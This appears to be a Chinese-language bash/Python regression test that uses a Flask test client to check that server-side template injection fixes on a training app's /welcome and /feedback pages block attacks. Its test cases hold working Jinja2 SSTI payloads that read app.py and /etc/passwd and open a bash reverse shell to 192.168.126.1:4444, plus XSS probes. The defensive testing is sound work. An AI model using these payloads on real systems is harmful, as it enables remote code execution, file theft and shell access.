#!/bin/bash
# ==============================================================================
# /welcome 和 /feedback SSTI 服务端模板注入 curl 批量测试脚本
# 靶机: http://192.168.126.133:5000
# 依据: 《SSTI漏洞挖掘与利用教学培训》《NPS内网穿透与Shell反弹实验培训》
# 预期: 修复前全部Payload成功执行; 修复后全部拦截/纯文本显示
# 注意: 仅测试/welcome和/feedback, 不干扰其他模块
# ==============================================================================

TARGET="http://192.168.126.133:5000"
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
PASS=0; FAIL=0; TOTAL=0

echo ""
echo "============================================================"
echo "  /welcome + /feedback — SSTI 服务端模板注入 批量测试"
echo "  靶机: $TARGET"
echo "============================================================"
echo ""

# 用 Flask test client 测试
python3 << 'PYEOF'
import sys, re, urllib.parse; sys.path.insert(0, "/opt/Class01")
from app import app as flask_app

PASS=0; FAIL=0; TOTAL=0

def check(label, condition, expected_block=True):
    global PASS, FAIL, TOTAL
    TOTAL+=1
    if expected_block:
        if condition:
            print(f"  ✅ {label} — 拦截成功"); PASS+=1
        else:
            print(f"  ❌ {label} — 未拦截"); FAIL+=1
    else:
        if condition:
            print(f"  ✅ {label}"); PASS+=1
        else:
            print(f"  ❌ {label}"); FAIL+=1

with flask_app.test_client() as c:
    print("=" * 55)
    print("1️⃣  /welcome 反射型 SSTI 测试")
    print("=" * 55)

    # TC-S01: 正常中文
    r = c.get("/welcome?name=" + urllib.parse.quote("张三"))
    check("TC-S01: 正常中文名", "张三" in r.data.decode(), False)
    assert "欢迎你" in r.data.decode()

    # TC-S02: {{7*7}} 基础探测
    r = c.get("/welcome?name=" + urllib.parse.quote("{{7*7}}"))
    # 修复前: 返回"49"; 修复后: 返回"{{7*7}}"纯文本
    check("TC-S02: {{7*7}}探测", "49" not in r.data.decode())

    # TC-S03: {{config}}
    r = c.get("/welcome?name=" + urllib.parse.quote("{{config}}"))
    check("TC-S03: {{config}}读取", "Config" not in r.data.decode() and "SECRET_KEY" not in r.data.decode())

    # TC-S04: __class__ 拦截
    r = c.get("/welcome?name=__class__")
    check("TC-S04: __class__关键字", "WAF" in r.data.decode())

    # TC-S05: __mro__ 拦截
    r = c.get("/welcome?name=__mro__")
    check("TC-S05: __mro__关键字", "WAF" in r.data.decode())

    # TC-S06: __subclasses__ 拦截
    r = c.get("/welcome?name=__subclasses__")
    check("TC-S06: __subclasses__关键字", "WAF" in r.data.decode())

    # TC-S07: MRO完整链执行id
    payload = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
    r = c.get("/welcome?name=" + urllib.parse.quote(payload))
    check("TC-S07: MRO链遍历", "WAF" in r.data.decode() or "__mro__" not in r.data.decode())

    # TC-S08: 魔术方法读取app.py
    payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat app.py').read() }}"
    r = c.get("/welcome?name=" + urllib.parse.quote(payload))
    check("TC-S08: 魔术读取app.py", "WAF" in r.data.decode() or "Flask" not in r.data.decode())

    # TC-S09: 魔术方法读取/etc/passwd
    payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}"
    r = c.get("/welcome?name=" + urllib.parse.quote(payload))
    check("TC-S09: 魔术读/etc/passwd", "WAF" in r.data.decode() or "root" not in r.data.decode())

    # TC-S10: 反弹Shell载荷（短）
    payload = "{{ config.__class__.__init__.__globals__['os'].popen('bash -c \"bash -i >& /dev/tcp/192.168.126.1/4444 0>&1\"').read() }}"
    r = c.get("/welcome?name=" + urllib.parse.quote(payload))
    check("TC-S10: NPS反弹Shell载荷", "WAF" in r.data.decode())

    # TC-S11: <script> XSS标签转义
    r = c.get("/welcome?name=" + urllib.parse.quote("<script>alert(1)</script>"))
    check("TC-S11: <script>XSS转义", "<script>" not in r.data.decode())

    print("\n" + "=" * 55)
    print("2️⃣  /feedback 复合型 SSTI 测试")
    print("=" * 55)

    # TC-S12: 正常提交
    r = c.post("/feedback", data={"name":"李四","message":"系统很好"})
    check("TC-S12: 正常反馈", "李四" in r.data.decode() and "系统很好" in r.data.decode(), False)

    # TC-S13: {{7*7}} 基础探测
    r = c.post("/feedback", data={"name":"{{7*7}}","message":"{{7*7}}"})
    check("TC-S13: {{7*7}}探测", "49" not in r.data.decode())

    # TC-S14: __class__ 拦截
    r = c.post("/feedback", data={"name":"__class__","message":"test"})
    check("TC-S14: __class__关键字", "WAF" in r.data.decode())

    # TC-S15: 读取敏感文件
    payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}"
    r = c.post("/feedback", data={"name":payload,"message":"x"})
    check("TC-S15: 魔术读/etc/passwd", "WAF" in r.data.decode() or "root" not in r.data.decode())

    # TC-S16: 反弹Shell
    payload = "{{ config.__class__.__init__.__globals__['os'].popen('bash -c \"bash -i >& /dev/tcp/192.168.126.1/4444 0>&1\"').read() }}"
    r = c.post("/feedback", data={"name":payload,"message":"x"})
    check("TC-S16: 反弹Shell载荷", "WAF" in r.data.decode())

    # TC-S17: <script> 转义
    r = c.post("/feedback", data={"name":"test","message":"<script>alert('xss')</script>"})
    check("TC-S17: <script>XSS转义", "<script>" not in r.data.decode())

    print("\n" + "=" * 55)
    print("3️⃣  原有功能不变")
    print("=" * 55)
    assert "注册" in c.get("/register").data.decode(); print("   ✅ 注册页")
    assert c.get("/").status_code == 200; print("   ✅ 搜索")
    assert "上传" in c.get("/upload").data.decode(); print("   ✅ 上传页")
    assert "帮助中心" in c.get("/page?name=help").data.decode(); print("   ✅ 帮助中心")

    print(f"\n{'='*55}")
    print(f"  总用例: {TOTAL} | PASS: {PASS} | FAIL: {FAIL}")
    print(f"{'='*55}")
    if FAIL == 0:
        print("  ✅ 修复判定: 三层SSTI防御全部生效, 漏洞修复通过")
    else:
        print("  ❌ 修复判定: 存在未修复的SSTI注入风险")
    print(f"{'='*55}")
PYEOF
